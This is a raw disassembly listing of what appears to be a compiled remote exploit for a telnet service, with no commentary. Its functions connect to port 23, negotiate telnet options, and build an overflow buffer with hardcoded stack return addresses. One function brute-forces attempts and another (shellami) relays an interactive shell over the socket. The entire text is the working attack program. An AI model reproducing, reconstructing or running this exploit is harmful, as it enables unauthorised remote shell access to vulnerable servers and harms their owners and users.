sub    esp,0x8
mov    DWORD PTR [ebp-0x4],0x0
lea    esi,[esi+0x0]
mov    eax,ds:0x804bef0
mov    ecx,eax
imul   ecx,DWORD PTR ds:0x804bef8
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,ds:0x804bf00
sub    eax,edx
cmp    ecx,eax
jne    80498ac <calc_rewtn1+0x30>
jmp    80498cc <calc_rewtn1+0x50>
mov    esi,esi
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,ds:0x804bf00
sub    eax,edx
cdq    
idiv   DWORD PTR ds:0x804bef8
mov    ds:0x804bef0,eax
lea    eax,[ebp-0x4]
inc    DWORD PTR [eax]
jmp    804988c <calc_rewtn1+0x10>
lea    esi,[esi+0x0]
nop
lea    esi,[esi+0x0]
cmp    DWORD PTR ds:0x804bef4,0x3e8
jle    80498fc <calc_rewtn1+0x80>
sub    esp,0x8
push   0x804a97d
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
nop
inc    DWORD PTR ds:0x804bef4
mov    eax,ds:0x804bef0
mov    edx,eax
imul   edx,DWORD PTR ds:0x804bef8
mov    eax,ds:0x804bef4
imul   eax,DWORD PTR ds:0x804befc
lea    eax,[eax+edx*1]
cmp    eax,DWORD PTR ds:0x804bf00
jl     804992c <calc_rewtn1+0xb0>
jmp    8049957 <calc_rewtn1+0xdb>
mov    esi,esi
inc    DWORD PTR ds:0x804bef4
mov    eax,ds:0x804bef0
mov    edx,eax
imul   edx,DWORD PTR ds:0x804bef8
mov    eax,ds:0x804bef4
imul   eax,DWORD PTR ds:0x804befc
lea    eax,[eax+edx*1]
cmp    eax,DWORD PTR ds:0x804bf00
jl     804992c <calc_rewtn1+0xb0>
mov    eax,ds:0x804bef0
mov    edx,eax
imul   edx,DWORD PTR ds:0x804bef8
mov    eax,ds:0x804bef4
imul   eax,DWORD PTR ds:0x804befc
lea    eax,[eax+edx*1]
cmp    DWORD PTR ds:0x804bf00,eax
jne    8049980 <calc_rewtn1+0x104>
jmp    804998c <calc_rewtn1+0x110>
mov    esi,esi
dec    DWORD PTR ds:0x804bef0
jmp    80498d0 <calc_rewtn1+0x54>
nop
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x4b4
mov    DWORD PTR [ebp-0x41c],0x804a987
push   0x0
sub    esp,0x8
push   DWORD PTR [ebp-0x41c]
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
push   DWORD PTR [ebp-0x41c]
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
lea    esi,[esi+0x0]
mov    eax,0x0
mov    ecx,0x20
lea    edi,[ebp-0x4a8]
cld    
rep stos DWORD PTR es:[edi],eax
mov    eax,ecx
mov    DWORD PTR [ebp-0x4ac],eax
mov    eax,edi
mov    DWORD PTR [ebp-0x4b0],eax
mov    eax,DWORD PTR [ebp+0x8]
shr    eax,0x5
imul   ecx,eax,0x4
lea    eax,[ebp-0x4a8]
mov    edx,eax
mov    eax,DWORD PTR [ebp+0x8]
and    eax,0x1f
bts    DWORD PTR [ecx+edx*1],eax
mov    eax,0x0
bts    DWORD PTR [ebp-0x4a8],eax
sub    esp,0xc
push   0x0
push   0x0
push   0x0
lea    eax,[ebp-0x4a8]
push   eax
mov    eax,DWORD PTR [ebp+0x8]
inc    eax
push   eax
call   804883c <select@plt>
add    esp,0x20
mov    eax,DWORD PTR [ebp+0x8]
mov    ecx,eax
and    ecx,0x1f
mov    eax,DWORD PTR [ebp+0x8]
shr    eax,0x5
imul   edx,eax,0x4
lea    eax,[ebp-0x4a8]
mov    eax,eax
bt     DWORD PTR [edx+eax*1],ecx
setb   al
test   al,al
je     8049ac2 <shellami+0x132>
sub    esp,0x4
push   0x400
lea    eax,[ebp-0x418]
push   eax
push   DWORD PTR [ebp+0x8]
call   804898c <read@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jg     8049a9c <shellami+0x10c>
sub    esp,0xc
push   0x804a9a0
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
call   80488ec <exit@plt>
mov    esi,esi
lea    eax,[ebp-0x418]
mov    edx,eax
mov    eax,DWORD PTR [ebp-0xc]
mov    BYTE PTR [eax+edx*1],0x0
sub    esp,0x8
lea    eax,[ebp-0x418]
push   eax
push   0x804a9c4
call   80488bc <printf@plt>
add    esp,0x10
mov    eax,0x0
bt     DWORD PTR [ebp-0x4a8],eax
setb   al
test   al,al
je     80499d0 <shellami+0x40>
sub    esp,0x4
push   0x400
lea    eax,[ebp-0x418]
push   eax
push   0x0
call   804898c <read@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jle    80499d0 <shellami+0x40>
lea    eax,[ebp-0x418]
mov    edx,eax
mov    eax,DWORD PTR [ebp-0xc]
mov    BYTE PTR [eax+edx*1],0x0
sub    esp,0x4
push   DWORD PTR [ebp-0xc]
lea    eax,[ebp-0x418]
push   eax
push   DWORD PTR [ebp+0x8]
call   80487ec <write@plt>
add    esp,0x10
jmp    80499d0 <shellami+0x40>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x245c
lea    eax,[ebp-0x18]
sub    eax,0x2430
lea    edi,[ebp-0x2448]
mov    esi,0x804a9c7
cld    
mov    ecx,0x9
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
mov    DWORD PTR [ebp-0x2458],0x8056769
mov    DWORD PTR [ebp-0x2454],0x8
mov    eax,DWORD PTR [ebp+0xc]
sub    eax,0xc
mov    DWORD PTR [ebp-0x2450],eax
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [ebp-0x244c],eax
mov    DWORD PTR [ebp-0x2468],0x0
mov    DWORD PTR [ebp-0x2464],0x0
mov    DWORD PTR [ebp-0x2460],0xbfffda69
mov    DWORD PTR [ebp-0x245c],0xbfffda69
sub    esp,0x8
push   0x804a9d0
lea    eax,[ebp-0x242c]
push   eax
call   804899c <strcpy@plt>
add    esp,0x10
sub    esp,0x4
push   0x1000
push   0x0
lea    eax,[ebp-0x2028]
push   eax
call   804893c <memset@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x1c],0x0
nop
mov    edx,DWORD PTR ds:0x804bc50
mov    eax,edx
shl    eax,1
add    eax,edx
shl    eax,0x3
lea    ecx,[eax+0x10]
mov    edx,0x804bbc4
mov    eax,DWORD PTR [ebp-0x1c]
cmp    eax,DWORD PTR [ecx+edx*1]
jl     8049c04 <__mk_darea+0xd4>
jmp    8049c24 <__mk_darea+0xf4>
lea    esi,[esi+0x0]
sub    esp,0x8
lea    eax,[ebp-0x242c]
push   eax
lea    eax,[ebp-0x2028]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
lea    eax,[ebp-0x1c]
inc    DWORD PTR [eax]
jmp    8049be0 <__mk_darea+0xb0>
sub    esp,0x4
push   0x1000
push   0x0
lea    eax,[ebp-0x1028]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
lea    eax,[ebp-0x2028]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x2028]
push   eax
lea    eax,[ebp-0x1028]
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x2458]
push   eax
lea    ebx,[ebp-0x1028]
lea    eax,[ebp-0x2028]
push   eax
call   804887c <strlen@plt>
add    esp,0x4
mov    eax,eax
mov    eax,eax
lea    eax,[eax+ebx*1]
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x2468]
push   eax
lea    ebx,[ebp-0x1028]
lea    eax,[ebp-0x2028]
push   eax
call   804887c <strlen@plt>
add    esp,0x4
mov    eax,eax
mov    eax,eax
lea    eax,[eax+ebx*1]
add    eax,0x10
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
sub    esp,0x8
push   0x804a9d2
lea    eax,[ebp-0x242c]
push   eax
call   804899c <strcpy@plt>
add    esp,0x10
sub    esp,0x4
push   0x400
push   0x0
lea    eax,[ebp-0x2428]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
lea    eax,[ebp-0x2448]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x2448]
push   eax
lea    eax,[ebp-0x2428]
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x1c],0x0
lea    esi,[esi+0x0]
cmp    DWORD PTR [ebp-0x1c],0xff
jle    8049d48 <__mk_darea+0x218>
jmp    8049d68 <__mk_darea+0x238>
nop
sub    esp,0x8
lea    eax,[ebp-0x242c]
push   eax
lea    eax,[ebp-0x2428]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
lea    eax,[ebp-0x1c]
inc    DWORD PTR [eax]
jmp    8049d3c <__mk_darea+0x20c>
sub    esp,0x8
push   0x804bca0
lea    eax,[ebp-0x2428]
push   eax
call   80488ac <strcat@plt>
add    esp,0x10
sub    esp,0x4
lea    eax,[ebp-0x2428]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x2428]
push   eax
lea    ebx,[ebp-0x1028]
lea    eax,[ebp-0x2028]
push   eax
call   804887c <strlen@plt>
add    esp,0x4
mov    eax,eax
mov    eax,eax
lea    eax,[eax+ebx*1]
add    eax,0x20
push   eax
call   80488cc <memcpy@plt>
add    esp,0x10
sub    esp,0x4
lea    eax,[ebp-0x2028]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    ebx,eax
lea    eax,[ebp-0x2428]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
lea    eax,[eax+ebx*1]
add    eax,0x20
push   eax
lea    eax,[ebp-0x1028]
push   eax
push   DWORD PTR [ebp+0x8]
call   80487ec <write@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0x4],0x0
cmp    DWORD PTR [ebp-0x4],0x1fff
jle    8049e38 <cl3anuppa+0x20>
jmp    8049e54 <cl3anuppa+0x3c>
nop
sub    esp,0x4
push   0x1
push   DWORD PTR [ebp-0x8]
push   DWORD PTR [ebp+0x8]
call   80487ec <write@plt>
add    esp,0x10
lea    eax,[ebp-0x4]
inc    DWORD PTR [eax]
jmp    8049e2c <cl3anuppa+0x14>
mov    esi,esi
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x1008
sub    esp,0xc
push   0x18
push   0xfc
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x1008]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x1008]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x1008]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   0x20
push   0xfc
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x1008]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x1008]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x1008]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   0x23
push   0xfc
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x1008]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x1008]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x1008]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0x4
push   0x804bc68
push   0x804a9c4
lea    eax,[ebp-0x1008]
push   eax
call   804896c <sprintf@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x1008]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x1008]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
push   0xfb
push   0xff
push   0x804a7b2
lea    eax,[ebp-0x1008]
push   eax
call   804896c <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x1008]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x1008]
push   eax
push   DWORD PTR [ebp+0x8]
call   804891c <send@plt>
add    esp,0x10
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    DWORD PTR [ebp-0x4],0x0
sub    esp,0x8
push   DWORD PTR [ebp+0x8]
push   0x804a9d4
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804aa00
call   80488bc <printf@plt>
add    esp,0x10
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc0
cmp    DWORD PTR [edx+eax*1],0x45
jne    804a03c <usage+0x58>
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
lea    esi,[esi+0x0]
sub    esp,0x4
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc4
push   DWORD PTR [edx+eax*1]
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,edx
shl    eax,1
add    eax,edx
lea    edx,[eax*8+0x0]
mov    eax,0x804bbc0
push   DWORD PTR [edx+eax*1]
push   0x804aab9
call   80488bc <printf@plt>
add    esp,0x10
lea    eax,[ebp-0x4]
inc    DWORD PTR [eax]
jmp    804a014 <usage+0x30>
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x234
sub    esp,0xc
push   0x100
call   804884c <malloc@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x210],eax
mov    DWORD PTR [ebp-0x218],0x0
sub    esp,0x4
push   0x4
push   0x0
push   DWORD PTR [ebp-0x210]
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x8
push   0x17
push   DWORD PTR [ebp+0x8]
call   80492a8 <sockami>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x214],eax
cmp    DWORD PTR [ebp-0x214],0xffffffff
jne    804a108 <__ck_hnam_re+0x84>
sub    esp,0x8
push   0x804a756
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
mov    esi,esi
sub    esp,0x8
push   0x804a8e3
push   DWORD PTR [ebp-0x214]
call   80487cc <fdopen@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x220],eax
sub    esp,0x4
push   0x100
lea    eax,[ebp-0x208]
push   eax
push   DWORD PTR [ebp-0x214]
call   804898c <read@plt>
add    esp,0x10
sub    esp,0x8
push   0x804aac3
lea    eax,[ebp-0x108]
push   eax
call   804899c <strcpy@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x108]
sub    esp,0x8
push   eax
call   804887c <strlen@plt>
add    esp,0xc
mov    eax,eax
mov    eax,eax
push   eax
lea    eax,[ebp-0x108]
push   eax
push   DWORD PTR [ebp-0x214]
call   804891c <send@plt>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0x220]
call   804882c <fflush@plt>
add    esp,0x10
sub    esp,0xc
push   0x186a0
call   80487ac <usleep@plt>
add    esp,0x10
sub    esp,0x4
push   0x100
push   0x0
lea    eax,[ebp-0x208]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
push   0x100
lea    eax,[ebp-0x208]
push   eax
push   DWORD PTR [ebp-0x214]
call   804898c <read@plt>
add    esp,0x10
lea    eax,[ebp-0x208]
sub    esp,0x8
push   0x5b
push   eax
call   80487bc <strchr@plt>
add    esp,0x10
mov    eax,eax
mov    eax,eax
mov    DWORD PTR [ebp-0x20c],eax
cmp    DWORD PTR [ebp-0x20c],0x0
jne    804a228 <__ck_hnam_re+0x1a4>
sub    esp,0x8
push   0x804a97d
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
mov    esi,esi
lea    eax,[ebp-0x20c]
inc    DWORD PTR [eax]
mov    eax,DWORD PTR [ebp-0x20c]
cmp    BYTE PTR [eax],0x3
jne    804a2ec <__ck_hnam_re+0x268>
sub    esp,0x4
push   0x100
push   0x0
lea    eax,[ebp-0x208]
push   eax
call   804893c <memset@plt>
add    esp,0x10
sub    esp,0x4
push   0x100
lea    eax,[ebp-0x208]
push   eax
push   DWORD PTR [ebp-0x214]
call   804898c <read@plt>
add    esp,0x10
lea    eax,[ebp-0x208]
mov    DWORD PTR [ebp-0x20c],eax
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x20c]
cmp    BYTE PTR [eax],0x5b
jne    804a294 <__ck_hnam_re+0x210>
jmp    804a2a0 <__ck_hnam_re+0x21c>
lea    esi,[esi+0x0]
lea    eax,[ebp-0x20c]
inc    DWORD PTR [eax]
jmp    804a284 <__ck_hnam_re+0x200>
mov    esi,esi
lea    eax,[ebp-0x20c]
inc    DWORD PTR [eax]
mov    eax,DWORD PTR [ebp-0x20c]
cmp    BYTE PTR [eax],0x20
jne    804a2c0 <__ck_hnam_re+0x23c>
mov    eax,DWORD PTR [ebp-0x210]
mov    eax,eax
jmp    804a3c1 <__ck_hnam_re+0x33d>
mov    eax,DWORD PTR [ebp-0x218]
mov    edx,DWORD PTR [ebp-0x210]
add    edx,eax
mov    eax,DWORD PTR [ebp-0x20c]
mov    al,BYTE PTR [eax]
mov    BYTE PTR [edx],al
lea    eax,[ebp-0x20c]
inc    DWORD PTR [eax]
lea    eax,[ebp-0x218]
inc    DWORD PTR [eax]
jmp    804a2a8 <__ck_hnam_re+0x224>
mov    esi,esi
nop
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x20c]
cmp    BYTE PTR [eax],0x20
jne    804a300 <__ck_hnam_re+0x27c>
jmp    804a32c <__ck_hnam_re+0x2a8>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x218]
mov    edx,DWORD PTR [ebp-0x210]
add    edx,eax
mov    eax,DWORD PTR [ebp-0x20c]
mov    al,BYTE PTR [eax]
mov    BYTE PTR [edx],al
lea    eax,[ebp-0x20c]
inc    DWORD PTR [eax]
lea    eax,[ebp-0x218]
inc    DWORD PTR [eax]
jmp    804a2f0 <__ck_hnam_re+0x26c>
mov    esi,esi
sub    esp,0xc
push   DWORD PTR [ebp-0x210]
call   804887c <strlen@plt>
add    esp,0x10
mov    eax,eax
mov    edx,eax
mov    DWORD PTR [ebp-0x22c],0xaaaaaaab
mov    eax,DWORD PTR [ebp-0x22c]
mul    edx
mov    eax,edx
shr    eax,1
mov    DWORD PTR [ebp-0x21c],eax
mov    eax,DWORD PTR [ebp-0x21c]
mov    ebx,eax
shl    ebx,1
add    ebx,eax
sub    esp,0xc
push   DWORD PTR [ebp-0x210]
call   804887c <strlen@plt>
add    esp,0x10
mov    eax,eax
mov    eax,eax
cmp    ebx,eax
jne    804a3a8 <__ck_hnam_re+0x324>
sub    esp,0x4
push   DWORD PTR [ebp-0x210]
push   0x804aae0
push   DWORD PTR ds:0x804becc
call   804881c <fprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   80488ec <exit@plt>
sub    esp,0xc
push   DWORD PTR [ebp-0x214]
call   80487fc <close@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x210]
mov    eax,eax
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    DWORD PTR [ebp-0x4],0x1
sub    esp,0xc
push   0x804ab20
call   80488bc <printf@plt>
add    esp,0x10
lea    esi,[esi+0x0]
cmp    DWORD PTR [ebp-0x4],0x63
jle    804a3f0 <brewtine+0x28>
jmp    804a434 <brewtine+0x6c>
sub    esp,0x8
push   DWORD PTR [ebp-0x4]
push   0x804ab4c
call   80488bc <printf@plt>
add    esp,0x10
sub    esp,0x8
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   8048f18 <try_this_time>
add    esp,0x10
mov    eax,eax
cmp    eax,0xffffffff
jne    804a42b <brewtine+0x63>
sub    esp,0xc
push   0x804ab69
call   80488bc <printf@plt>
add    esp,0x10
lea    eax,[ebp-0x4]
inc    DWORD PTR [eax]
jmp    804a3e8 <brewtine+0x20>
mov    esi,esi
mov    eax,0xffffffff
leave  
ret    
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
mov    eax,ds:0x804be2c
mov    ebx,0x804be2c
cmp    eax,0xffffffff
je     804a46c <__do_global_ctors_aux+0x2c>
lea    esi,[esi+0x0]
lea    edi,[edi+eiz*1+0x0]
sub    ebx,0x4
call   eax
mov    eax,DWORD PTR [ebx]
cmp    eax,0xffffffff
jne    804a460 <__do_global_ctors_aux+0x20>
pop    eax
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
push   edx
call   804a48a <_fini+0xa>
pop    ebx
add    ebx,0x19b2
lea    esi,[esi+0x0]
call   8048a00 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
